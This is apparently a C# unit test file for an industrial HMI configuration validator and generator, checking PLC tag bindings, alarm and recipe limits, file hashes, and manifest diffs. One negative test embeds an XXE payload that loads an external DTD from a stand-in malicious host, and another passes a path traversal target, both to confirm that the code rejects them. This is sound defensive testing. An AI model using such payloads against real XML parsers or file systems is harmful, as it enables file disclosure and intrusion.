using System.Security.Cryptography;
using System.Text.Json;
using System.Xml;
using PlcMcp.Contracts.Models;
using PlcMcp.Engineering.Hmi;
using PlcMcp.Engineering.Models;
using PlcMcp.Engineering.Plcopen;
using PlcMcp.Engineering.Workspace;

namespace PlcMcp.Engineering.Tests;

public class HmiConfigurationTests : IDisposable
{
    private readonly string _tempTestDir;
    private readonly HmiValidator _validator = new();
    private readonly HmiArtifactGenerator _generator = new();
    private readonly PlcopenXmlParser _plcopenParser = new();

    public HmiConfigurationTests()
    {
        _tempTestDir = Path.Combine(Path.GetTempPath(), "PlcMcp_HmiTests_" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(_tempTestDir);
    }

    public void Dispose()
    {
        try
        {
            if (Directory.Exists(_tempTestDir))
            {
                foreach (var file in Directory.GetFiles(_tempTestDir, "*", SearchOption.AllDirectories))
                {
                    File.SetAttributes(file, FileAttributes.Normal);
                }
                Directory.Delete(_tempTestDir, recursive: true);
            }
        }
        catch
        {
            // Best effort cleanup
        }
    }

    private static (HmiManifest manifest, List<TagDefinition> tags, List<EngineeringSymbol> symbols) CreateValidFixture()
    {
        var tags = new List<TagDefinition>
        {
            new("AutoStartCmd", "%QX0.0", PlcDataType.Bool, null, null, null, CanRead: true, CanWrite: true, SafetyClass: SafetyClass.Actuator),
            new("SystemRunning", "%IX0.0", PlcDataType.Bool, null, null, null, CanRead: true, CanWrite: false, SafetyClass: SafetyClass.ReadOnly),
            new("OvenTemperature", "%MD100", PlcDataType.Real, "degC", -20.0, 500.0, CanRead: true, CanWrite: false, SafetyClass: SafetyClass.ReadOnly),
            new("TargetTemperature", "%MD104", PlcDataType.Real, "degC", 0.0, 450.0, CanRead: true, CanWrite: true, SafetyClass: SafetyClass.Parameter),
            new("ConveyorSpeed", "%MW200", PlcDataType.Int16, "rpm", 0.0, 3000.0, CanRead: true, CanWrite: true, SafetyClass: SafetyClass.Parameter),
            new("AlarmWord", "%MW202", PlcDataType.UInt16, null, 0.0, 65535.0, CanRead: true, CanWrite: false, SafetyClass: SafetyClass.ReadOnly)
        };

        var symbols = new List<EngineeringSymbol>
        {
            new("g_EmergencyStop", "%IX0.1", "BOOL", "Physical E-Stop contact", "Global"),
            new("g_TowerLightGreen", "%QX0.1", "BOOL", "Stack light green indicator", "Global")
        };

        var screens = new List<HmiScreenDefinition>
        {
            new("SCR_MAIN", "Main Overview Screen", "Primary plant overview screen", new[] { "TAG_StartCmd", "TAG_RunningStatus", "TAG_OvenTemp" }),
            new("SCR_RECIPE", "Oven Recipe Screen", "Recipe setup and batch parameter tuning", new[] { "TAG_TargetTemp", "TAG_Speed" }),
            new("SCR_ALARM", "Alarm Summary Screen", "Active and historical alarms display")
        };

        var tagBindings = new List<HmiTagBinding>
        {
            new("TAG_StartCmd", "AutoStartCmd", HmiAccessRight.ReadWrite, PlcDataType.Bool, null, new[] { "SCR_MAIN" }, "HMI Start Pushbutton"),
            new("TAG_RunningStatus", "SystemRunning", HmiAccessRight.ReadOnly, PlcDataType.Bool, null, new[] { "SCR_MAIN" }, "Running status lamp"),
            new("TAG_OvenTemp", "OvenTemperature", HmiAccessRight.ReadOnly, PlcDataType.Real, "degC", new[] { "SCR_MAIN" }, "Current oven temperature sensor"),
            new("TAG_TargetTemp", "TargetTemperature", HmiAccessRight.ReadWrite, PlcDataType.Real, "degC", new[] { "SCR_RECIPE" }, "Recipe target temperature setting"),
            new("TAG_Speed", "ConveyorSpeed", HmiAccessRight.ReadWrite, PlcDataType.Int16, "rpm", new[] { "SCR_RECIPE" }, "Conveyor motor setpoint"),
            new("TAG_TowerGreen", "g_TowerLightGreen", HmiAccessRight.ReadWrite, PlcDataType.Bool, null, new[] { "SCR_MAIN" }, "PLCopen bound stack light green"),
            new("TAG_EStop", "g_EmergencyStop", HmiAccessRight.ReadOnly, PlcDataType.Bool, null, new[] { "SCR_MAIN" }, "Physical E-stop input monitor")
        };

        var alarms = new List<HmiAlarmEntry>
        {
            new("ALM_001", "TAG_EStop", HmiAlarmSeverity.Critical, "ALARM_ESTOP_ACTIVE", "SCR_ALARM"),
            new("ALM_002", "TAG_OvenTemp", HmiAlarmSeverity.Warning, "ALARM_OVEN_OVERHEAT", "SCR_ALARM", HighLimit: 400.0, LowLimit: 50.0)
        };

        var recipes = new List<HmiRecipeDefinition>
        {
            new("RCP_STANDARD", "Standard Curing Recipe", new List<HmiRecipeParameter>
            {
                new("TargetTemp", "TAG_TargetTemp", PlcDataType.Real, 50.0, 350.0, 220.0, "degC"),
                new("ConveyorSpeed", "TAG_Speed", PlcDataType.Int16, 100.0, 2500.0, 1200.0, "rpm")
            })
        };

        var localizations = new List<HmiLocalizationEntry>
        {
            new("ALARM_ESTOP_ACTIVE", new Dictionary<string, string>
            {
                { "en-US", "Emergency Stop button has been actuated!" },
                { "zh-CN", "急停按钮已被按下！" }
            }),
            new("ALARM_OVEN_OVERHEAT", new Dictionary<string, string>
            {
                { "en-US", "Oven temperature is out of allowable boundaries!" },
                { "zh-CN", "烤箱温度超出允许工艺区间！" }
            })
        };

        var manifest = new HmiManifest(
            ManifestVersion: "1.0.0",
            HmiProjectName: "PaintShop_Oven_Hmi",
            TargetVendor: PlcVendor.Siemens,
            DefaultCulture: "zh-CN",
            SupportedCultures: new[] { "zh-CN", "en-US" },
            Screens: screens,
            TagBindings: tagBindings,
            Alarms: alarms,
            Recipes: recipes,
            Localizations: localizations);

        return (manifest, tags, symbols);
    }

    [Fact]
    public void Validate_ValidFixture_PassesAllChecks()
    {
        var (manifest, tags, symbols) = CreateValidFixture();

        var result = _validator.Validate(manifest, tags, symbols);

        Assert.True(result.IsValid, result.Summary);
        Assert.Empty(result.Errors);
        Assert.Equal(7, result.TagBindingCount);
        Assert.Equal(3, result.ScreenCount);
        Assert.Equal(2, result.AlarmCount);
        Assert.Equal(1, result.RecipeCount);
        Assert.Equal(2, result.LocalizationCount);
    }

    [Fact]
    public void Validate_EmptyPlcInputs_FailsClosedWhenRequirePlcDefinitionsIsTrue()
    {
        var (manifest, _, _) = CreateValidFixture();

        // Pass null or empty PLC definitions with default requirePlcDefinitions = true
        var result = _validator.Validate(manifest, null, null, requirePlcDefinitions: true);

        Assert.False(result.IsValid);
        Assert.Contains(result.Errors, e => e.Code == "VAL_PLC_SOURCE_MISSING");
    }

    [Fact]
    public void Validate_MissingPlcTagReference_FailsStrictly()
    {
        var (manifest, tags, symbols) = CreateValidFixture();

        var badBindings = manifest.TagBindings.Append(
            new HmiTagBinding("TAG_NonExistent", "GhostPlcTag", HmiAccessRight.ReadOnly, PlcDataType.Bool)
        ).ToList();

        var badManifest = manifest with { TagBindings = badBindings };

        var result = _validator.Validate(badManifest, tags, symbols);

        Assert.False(result.IsValid);
        var err = Assert.Single(result.Errors, e => e.Code == "VAL_TAG_PLC_REF_NOT_FOUND");
        Assert.Equal("TAG_NonExistent", err.Identifier);
    }

    [Fact]
    public void Validate_TagTypeMismatch_FailsStrictly()
    {
        var (manifest, tags, symbols) = CreateValidFixture();

        // OvenTemperature is Real in PLC, but HMI binds it expecting Int32
        var badBindings = manifest.TagBindings.Select(t =>
            t.HmiTagName == "TAG_OvenTemp"
                ? t with { ExpectedDataType = PlcDataType.Int32 }
                : t).ToList();

        var badManifest = manifest with { TagBindings = badBindings };

        var result = _validator.Validate(badManifest, tags, symbols);

        Assert.False(result.IsValid);
        var err = Assert.Single(result.Errors, e => e.Code == "VAL_TAG_TYPE_MISMATCH");
        Assert.Equal("TAG_OvenTemp", err.Identifier);
    }

    [Fact]
    public void Validate_WriteAccessToReadOnlyPlcTag_FailsStrictly()
    {
        var (manifest, tags, symbols) = CreateValidFixture();

        // SystemRunning has CanWrite = false, but HMI requests ReadWrite
        var badBindings = manifest.TagBindings.Select(t =>
            t.HmiTagName == "TAG_RunningStatus"
                ? t with { AccessRight = HmiAccessRight.ReadWrite }
                : t).ToList();

        var badManifest = manifest with { TagBindings = badBindings };

        var result = _validator.Validate(badManifest, tags, symbols);

        Assert.False(result.IsValid);
        var err = Assert.Single(result.Errors, e => e.Code == "VAL_TAG_WRITE_PERMISSION_DENIED");
        Assert.Equal("TAG_RunningStatus", err.Identifier);
    }

    [Fact]
    public void Validate_WriteAccessToPhysicalInput_FailsStrictly()
    {
        var (manifest, tags, symbols) = CreateValidFixture();

        // g_EmergencyStop is address %IX0.1. Requesting WriteOnly must fail
        var badBindings = manifest.TagBindings.Select(t =>
            t.HmiTagName == "TAG_EStop"
                ? t with { AccessRight = HmiAccessRight.WriteOnly }
                : t).ToList();

        var badManifest = manifest with { TagBindings = badBindings };

        var result = _validator.Validate(badManifest, tags, symbols);

        Assert.False(result.IsValid);
        var err = Assert.Single(result.Errors, e => e.Code == "VAL_TAG_WRITE_PERMISSION_DENIED");
        Assert.Equal("TAG_EStop", err.Identifier);
    }

    [Fact]
    public void Validate_UnitMismatch_FailsStrictly()
    {
        var (manifest, tags, symbols) = CreateValidFixture();

        // OvenTemperature unit in PLC is "degC", HMI specifies "degF"
        var badBindings = manifest.TagBindings.Select(t =>
            t.HmiTagName == "TAG_OvenTemp"
                ? t with { ExpectedUnit = "degF" }
                : t).ToList();

        var badManifest = manifest with { TagBindings = badBindings };

        var result = _validator.Validate(badManifest, tags, symbols);

        Assert.False(result.IsValid);
        var err = Assert.Single(result.Errors, e => e.Code == "VAL_TAG_UNIT_MISMATCH");
        Assert.Equal("TAG_OvenTemp", err.Identifier);
    }

    [Fact]
    public void Validate_DuplicateTagAndScreenAndAlarmIds_FailsStrictly()
    {
        var (manifest, tags, symbols) = CreateValidFixture();

        var dupScreens = manifest.Screens.Append(new HmiScreenDefinition("SCR_MAIN", "Duplicate Main")).ToList();
        var dupTags = manifest.TagBindings.Append(manifest.TagBindings[0]).ToList();
        var dupAlarms = manifest.Alarms.Append(manifest.Alarms[0]).ToList();

        var badManifest = manifest with
        {
            Screens = dupScreens,
            TagBindings = dupTags,
            Alarms = dupAlarms
        };

        var result = _validator.Validate(badManifest, tags, symbols);

        Assert.False(result.IsValid);
        Assert.Contains(result.Errors, e => e.Code == "VAL_SCREEN_DUPLICATE_ID");
        Assert.Contains(result.Errors, e => e.Code == "VAL_TAG_DUPLICATE_NAME");
        Assert.Contains(result.Errors, e => e.Code == "VAL_ALARM_DUPLICATE_ID");
    }

    [Fact]
    public void Validate_AlarmReferencingNonExistentTagOrScreenOrLocalization_FailsStrictly()
    {
        var (manifest, tags, symbols) = CreateValidFixture();

        var badAlarms = new List<HmiAlarmEntry>
        {
            new("ALM_BAD_TAG", "NON_EXISTENT_TAG", HmiAlarmSeverity.Critical, "ALARM_ESTOP_ACTIVE", "SCR_MAIN"),
            new("ALM_BAD_SCR", "TAG_EStop", HmiAlarmSeverity.Critical, "ALARM_ESTOP_ACTIVE", "SCR_NON_EXISTENT"),
            new("ALM_BAD_LOC", "TAG_EStop", HmiAlarmSeverity.Critical, "NON_EXISTENT_KEY", "SCR_MAIN")
        };

        var badManifest = manifest with { Alarms = badAlarms };

        var result = _validator.Validate(badManifest, tags, symbols);

        Assert.False(result.IsValid);
        Assert.Contains(result.Errors, e => e.Code == "VAL_ALARM_TAG_REF_MISSING");
        Assert.Contains(result.Errors, e => e.Code == "VAL_ALARM_SCREEN_REF_MISSING");
        Assert.Contains(result.Errors, e => e.Code == "VAL_ALARM_LOCALIZATION_REF_MISSING");
    }

    [Fact]
    public void Validate_AlarmAnalogLimitsOutOfPlcBounds_FailsStrictly()
    {
        var (manifest, tags, symbols) = CreateValidFixture();

        // OvenTemperature physical PLC range is [-20, 500]. Alarm set to HighLimit 600
        var badAlarms = new List<HmiAlarmEntry>
        {
            new("ALM_OVEN_OVERHEAT", "TAG_OvenTemp", HmiAlarmSeverity.Warning, "ALARM_OVEN_OVERHEAT", "SCR_MAIN", HighLimit: 600.0, LowLimit: 10.0),
            new("ALM_OVEN_INVERTED", "TAG_OvenTemp", HmiAlarmSeverity.Warning, "ALARM_OVEN_OVERHEAT", "SCR_MAIN", HighLimit: 100.0, LowLimit: 200.0)
        };

        var badManifest = manifest with { Alarms = badAlarms };

        var result = _validator.Validate(badManifest, tags, symbols);

        Assert.False(result.IsValid);
        Assert.Contains(result.Errors, e => e.Code == "VAL_ALARM_LIMIT_OUT_OF_BOUNDS");
        Assert.Contains(result.Errors, e => e.Code == "VAL_ALARM_LIMIT_RANGE_INVALID");
    }

    [Fact]
    public void Validate_RecipeParameterOutOfBoundsAndReadOnlyTag_FailsStrictly()
    {
        var (manifest, tags, symbols) = CreateValidFixture();

        // TargetTemperature in PLC is [0.0, 450.0]. Recipe specifies Min -10.0 and Max 500.0
        var badRecipes = new List<HmiRecipeDefinition>
        {
            new("RCP_INVALID", "Invalid Recipe", new List<HmiRecipeParameter>
            {
                new("TargetTemp", "TAG_TargetTemp", PlcDataType.Real, -10.0, 500.0, 100.0, "degC"),
                // Binding recipe to a ReadOnly tag (TAG_OvenTemp)
                new("ReadOnlyParam", "TAG_OvenTemp", PlcDataType.Real, 50.0, 200.0, 100.0, "degC")
            })
        };

        var badManifest = manifest with { Recipes = badRecipes };

        var result = _validator.Validate(badManifest, tags, symbols);

        Assert.False(result.IsValid);
        Assert.Contains(result.Errors, e => e.Code == "VAL_RECIPE_PARAM_OUT_OF_BOUNDS");
        Assert.Contains(result.Errors, e => e.Code == "VAL_RECIPE_TAG_READ_ONLY");
    }

    [Fact]
    public void Generate_ValidFixture_ProducesVendorNeutralJsonAndCsvPackageWithCorrectSha256()
    {
        var (manifest, tags, symbols) = CreateValidFixture();
        var outDir = Path.Combine(_tempTestDir, "hmi_output");

        // Act
        var package = _generator.Generate(manifest, outDir, tags, symbols);

        // Assert
        Assert.NotNull(package);
        Assert.Equal(manifest.ManifestVersion, package.ManifestVersion);
        Assert.Equal(manifest.HmiProjectName, package.HmiProjectName);
        Assert.Equal(manifest.TargetVendor, package.TargetVendor);
        Assert.Contains("Does not pretend to be proprietary WinCC/GOT/NA native binary project", package.Disclaimer);

        Assert.True(Directory.Exists(outDir));
        Assert.True(File.Exists(Path.Combine(outDir, "manifest.json")));
        Assert.True(File.Exists(Path.Combine(outDir, "package.json")));
        Assert.True(File.Exists(Path.Combine(outDir, "tags.json")));
        Assert.True(File.Exists(Path.Combine(outDir, "tags.csv")));
        Assert.True(File.Exists(Path.Combine(outDir, "screens.json")));
        Assert.True(File.Exists(Path.Combine(outDir, "screens.csv")));
        Assert.True(File.Exists(Path.Combine(outDir, "alarms.json")));
        Assert.True(File.Exists(Path.Combine(outDir, "alarms.csv")));
        Assert.True(File.Exists(Path.Combine(outDir, "recipes.json")));
        Assert.True(File.Exists(Path.Combine(outDir, "recipes.csv")));
        Assert.True(File.Exists(Path.Combine(outDir, "localizations.json")));
        Assert.True(File.Exists(Path.Combine(outDir, "localizations.csv")));

        // Verify that NO proprietary binary extension is created
        var allFiles = Directory.GetFiles(outDir, "*", SearchOption.AllDirectories);
        foreach (var file in allFiles)
        {
            var ext = Path.GetExtension(file).ToLowerInvariant();
            Assert.True(ext is ".json" or ".csv", $"Unexpected proprietary file format created: {file}");
        }

        // Verify SHA256 integrity of generated files
        using var sha256 = SHA256.Create();
        foreach (var artifactFile in package.Files)
        {
            var diskPath = Path.Combine(outDir, artifactFile.RelativePath);
            Assert.True(File.Exists(diskPath));

            var bytes = File.ReadAllBytes(diskPath);
            var computedHash = Convert.ToHexString(sha256.ComputeHash(bytes)).ToLowerInvariant();
            Assert.Equal(artifactFile.Sha256, computedHash);
            Assert.Equal(bytes.Length, artifactFile.ByteLength);
        }

        // Verify CSV content parsing
        var tagsCsvLines = File.ReadAllLines(Path.Combine(outDir, "tags.csv"));
        Assert.True(tagsCsvLines.Length > 1);
        Assert.Contains("TAG_StartCmd,AutoStartCmd,ReadWrite,Bool", tagsCsvLines[1]);

        var alarmsCsvLines = File.ReadAllLines(Path.Combine(outDir, "alarms.csv"));
        Assert.True(alarmsCsvLines.Length > 1);
        Assert.Contains("ALM_001,TAG_EStop,Critical,ALARM_ESTOP_ACTIVE", alarmsCsvLines[1]);
    }

    [Fact]
    public void Generate_FailsWhenValidationErrorsOccur_DoesNotWriteFiles()
    {
        var (manifest, tags, symbols) = CreateValidFixture();
        var badManifest = manifest with { ManifestVersion = "" }; // Invalid
        var outDir = Path.Combine(_tempTestDir, "fail_output");

        var ex = Assert.Throws<HmiValidationException>(() =>
            _generator.Generate(badManifest, outDir, tags, symbols));

        Assert.Contains("VAL_META_VERSION", ex.Message);
        Assert.False(Directory.Exists(outDir), "Output directory should not be created on validation failure.");
    }

    [Fact]
    public void Generate_PathTraversalAttemptInTargetDirectory_ThrowsUnauthorizedAccessException()
    {
        var (manifest, tags, symbols) = CreateValidFixture();
        var safeRoot = Path.Combine(_tempTestDir, "sandbox");
        Directory.CreateDirectory(safeRoot);

        // Path escaping the directory
        var traversalPath = Path.Combine(safeRoot, "..", "escaped_folder");

        Assert.Throws<UnauthorizedAccessException>(() =>
            _generator.Generate(manifest, traversalPath, tags, symbols, allowedRootDirectory: safeRoot));
    }

    [Fact]
    public void ParsePlcopen_XmlXxeProtectionNegativeTest_ThrowsProhibitedDtdXmlException()
    {
        var maliciousXml = """
            <?xml version="1.0" encoding="utf-8"?>
            <!DOCTYPE test [
              <!ENTITY % ext SYSTEM "http://malicious.evil.com/xxe.dtd">
              %ext;
            ]>
            <project xmlns="http://www.plcopen.org/xml/tc6_0201">
              <types><globalVars /></types>
            </project>
            """;

        Assert.Throws<XmlException>(() => _plcopenParser.Parse(maliciousXml));
    }

    [Fact]
    public void ParsePlcopen_ValidXmlIntegration_FeedsDirectlyIntoHmiValidatorAndPasses()
    {
        var plcopenXml = """
            <?xml version="1.0" encoding="utf-8"?>
            <project xmlns="http://www.plcopen.org/xml/tc6_0201">
              <fileHeader companyName="SiemensLine" />
              <contentHeader name="PackStation1" />
              <types>
                <globalVars>
                  <variable name="g_ConveyorRun" address="%QX0.0">
                    <type><BOOL /></type>
                  </variable>
                  <variable name="g_BottleCount" address="%MD10">
                    <type><DINT /></type>
                  </variable>
                  <variable name="g_SensorTrigger" address="%IX1.0">
                    <type><BOOL /></type>
                  </variable>
                </globalVars>
              </types>
            </project>
            """;

        var parsed = _plcopenParser.Parse(plcopenXml);
        Assert.Equal(3, parsed.Symbols.Count);

        var manifest = new HmiManifest(
            ManifestVersion: "1.0.0",
            HmiProjectName: "PackagingHmi",
            TargetVendor: PlcVendor.Siemens,
            DefaultCulture: "en-US",
            SupportedCultures: new[] { "en-US" },
            Screens: new[]
            {
                new HmiScreenDefinition("SCR_MAIN", "Main Screen", null, new[] { "HMI_ConveyorRun", "HMI_BottleCount", "HMI_Sensor" })
            },
            TagBindings: new[]
            {
                new HmiTagBinding("HMI_ConveyorRun", "g_ConveyorRun", HmiAccessRight.ReadWrite, PlcDataType.Bool),
                new HmiTagBinding("HMI_BottleCount", "g_BottleCount", HmiAccessRight.ReadOnly, PlcDataType.Int32),
                new HmiTagBinding("HMI_Sensor", "g_SensorTrigger", HmiAccessRight.ReadOnly, PlcDataType.Bool)
            },
            Alarms: new[]
            {
                new HmiAlarmEntry("ALM_STOP", "HMI_Sensor", HmiAlarmSeverity.Warning, "LOC_STOP", "SCR_MAIN")
            },
            Recipes: Array.Empty<HmiRecipeDefinition>(),
            Localizations: new[]
            {
                new HmiLocalizationEntry("LOC_STOP", new Dictionary<string, string> { { "en-US", "Sensor triggered stop" } })
            });

        var result = _validator.Validate(manifest, null, parsed.Symbols);

        Assert.True(result.IsValid, result.Summary);
    }

    [Fact]
    public void Compare_DetectsAddedModifiedRemovedAcrossAllSections()
    {
        var (baseManifest, _, _) = CreateValidFixture();

        // Target with modifications
        var newScreens = baseManifest.Screens
            .Where(s => s.ScreenId != "SCR_ALARM") // Remove SCR_ALARM
            .Append(new HmiScreenDefinition("SCR_CONFIG", "Configuration Screen")) // Add SCR_CONFIG
            .Select(s => s.ScreenId == "SCR_MAIN" ? s with { Name = "Main Screen V2" } : s) // Modify SCR_MAIN
            .ToList();

        var newTags = baseManifest.TagBindings
            .Select(t => t.HmiTagName == "TAG_Speed" ? t with { ExpectedUnit = "m/s" } : t) // Modify unit
            .Append(new HmiTagBinding("TAG_NewAux", "SystemRunning", HmiAccessRight.ReadOnly, PlcDataType.Bool)) // Add
            .ToList();

        var targetManifest = baseManifest with
        {
            HmiProjectName = "PaintShop_Oven_Hmi_V2",
            Screens = newScreens,
            TagBindings = newTags
        };

        var diff = _generator.Compare(baseManifest, targetManifest);

        Assert.True(diff.HasDifferences);
        Assert.NotNull(diff.BaseSha256);
        Assert.NotNull(diff.TargetSha256);

        // Project level diff
        Assert.Contains(diff.Diffs, d => d.Category == "Project" && d.Identifier == "HmiProjectName");

        // Screen diffs
        Assert.Contains(diff.Diffs, d => d.Category == "Screen" && d.ChangeType == "Added" && d.Identifier == "SCR_CONFIG");
        Assert.Contains(diff.Diffs, d => d.Category == "Screen" && d.ChangeType == "Removed" && d.Identifier == "SCR_ALARM");
        Assert.Contains(diff.Diffs, d => d.Category == "Screen" && d.ChangeType == "Modified" && d.Identifier == "SCR_MAIN");

        // Tag diffs
        Assert.Contains(diff.Diffs, d => d.Category == "TagBinding" && d.ChangeType == "Added" && d.Identifier == "TAG_NewAux");
        Assert.Contains(diff.Diffs, d => d.Category == "TagBinding" && d.ChangeType == "Modified" && d.Identifier == "TAG_Speed");
    }
}
